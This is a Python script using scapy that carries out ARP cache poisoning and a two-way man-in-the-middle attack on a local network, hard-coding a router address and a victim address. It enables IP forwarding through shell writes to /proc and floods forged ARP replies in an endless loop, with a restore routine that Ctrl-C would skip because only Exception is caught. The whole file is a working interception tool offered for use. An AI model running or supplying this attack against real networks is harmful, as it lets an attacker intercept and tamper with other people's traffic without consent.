import scapy.all as scapy
import os

# settings:
def enable_ip_forwarding():
    print ("Enabling IP Forwarding")
    os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")

def disable_ip_forwarding():
    print ("Disabling IP Forwarding")
    os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")

# reminders for me as i code:
# pdst is where the ARP packet should go (target) - destination ip,
# psrc is the IP to update in the target's arp table,
# hwsrc is the MAC corresponding to psrc, to update in the target's arp table
# hwdst is the MAC corresponding to pdst, to update in the target's arp table

def get_mac(ip):
    packet = scapy.Ether(dst = "ff:ff:ff:ff:ff:ff")/scapy.ARP(pdst = ip) # asking "who has this ip?"
    reply = scapy.srp(packet, timeout=2, verbose=False)[0]
    if reply:
        return reply[0][1].hwsrc
    return None
 
def find_mac_loop(ip):
    mac = None
    while not mac:
        mac = get_mac(ip)
    return mac

def spoof(target_ip, spoof_ip, target_mac):
    packet = scapy.ARP(op = 2, hwdst=target_mac, pdst=target_ip, psrc=spoof_ip)
    scapy.send(packet, verbose=False)
    print(f"Spoofing {target_ip}, pretending to be {spoof_ip}")

def restore(spoof_ip, target_ip, spoof_mac, target_mac):
    packet = scapy.ARP(op=2, pdst=spoof_ip, hwdst=spoof_mac, psrc=target_ip, hwsrc=target_mac)
    scapy.send(packet, verbose=False)
    print(f"Restoring {spoof_ip} to its original state.")

def mitm():
    enable_ip_forwarding()
    # attacking:
    print(f"attacking {spoof_ip}...")
    try:
        while True:
            spoof(target_ip, spoof_ip, target_mac)
            spoof(spoof_ip, target_ip, spoof_mac)
    except Exception:
        # restoring:
        restore(target_ip, spoof_ip, target_mac, spoof_mac)
        restore(spoof_ip, target_ip, spoof_mac, target_mac)
        print("ARP tables restored")
    
    disable_ip_forwarding()

def arp_spoofing():
    enable_ip_forwarding()
    # attacking:
    print(f"attacking {spoof_ip}...")
    try:
        while True:
            spoof(target_ip, spoof_ip, target_mac)
    except Exception:
        # restoring:
        restore(target_ip, spoof_ip, target_mac, spoof_mac)
        print("ARP tables restored")
    
    disable_ip_forwarding()

if __name__ == "__main__":
    target_ip = "192.168.1.1"
    spoof_ip = "192.168.1.117"
    target_mac = find_mac_loop(target_ip)
    spoof_mac = find_mac_loop(spoof_ip)
    mitm()
    print("Thanks for using my code :)")
